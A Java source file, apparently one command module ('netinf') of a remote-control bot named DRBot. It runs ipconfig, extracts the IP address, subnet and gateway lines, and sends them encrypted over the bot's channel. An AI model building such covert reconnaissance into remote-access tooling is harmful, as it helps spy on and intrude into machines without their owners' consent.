package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import java.io.BufferedReader;
import java.io.PrintWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

/**
 *
 * @author MerNat
 */
public class netinf implements Runnable{
    
    private final PrintWriter writer;
    private BufferedReader reader;
    private final List<String> allInfo;
    private String result;
    private ProcessBuilder pB;
    private Process ps;
    private final SecureLine secureLine;
    
    netinf(String[] commands,PrintWriter writer,SecureLine secureLine){
        result = "";
        allInfo = new ArrayList<>();
        this.writer = writer;
        this.secureLine = secureLine;
    }
    
    @Override
    public void run(){
        
        pB = new ProcessBuilder("ipconfig");
        try{
            ps = pB.start();
            reader = new BufferedReader(new InputStreamReader(ps.getInputStream()));
            String line;
            while((line = reader.readLine())!=null){
                if(line.indexOf(" IPv4")!=-1 || line.indexOf("IP Address")!=-1){
                    allInfo.add("["+line+"~ ");
                }
                else
                    if(line.indexOf("Subnet")!=-1){
                        allInfo.add(line+"~ ");
                    }
                else
                        if(line.indexOf("Gateway")!=-1 && line.indexOf("::")==-1){
                            allInfo.add(line+"]");
                        }
            }
            if(allInfo.isEmpty()){
                allInfo.add("   This Pc is not connected.");
            }
            Iterator<String> iter1 = allInfo.iterator();
            while(iter1.hasNext()){
                result += iter1.next();
            }
            toPrint("[netinf]"+result);            
        }
        catch(IOException ioEx){}
    }
        
    private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
}
